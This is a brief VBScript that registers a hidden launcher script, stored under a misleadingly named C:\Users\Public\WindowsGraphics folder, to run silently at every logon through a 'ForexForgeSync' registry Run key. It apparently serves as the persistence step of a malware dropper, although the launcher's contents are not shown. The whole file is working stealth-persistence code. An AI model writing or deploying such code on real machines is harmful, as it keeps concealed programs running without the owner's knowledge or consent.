Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Path to the launcher
strVBS = "C:\Users\Public\WindowsGraphics\launcher.vbs"

' Register it to run at startup
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ForexForgeSync"
strRunCmd = "wscript.exe //B """ & strVBS & """"

objShell.RegWrite strRegPath, strRunCmd, "REG_SZ"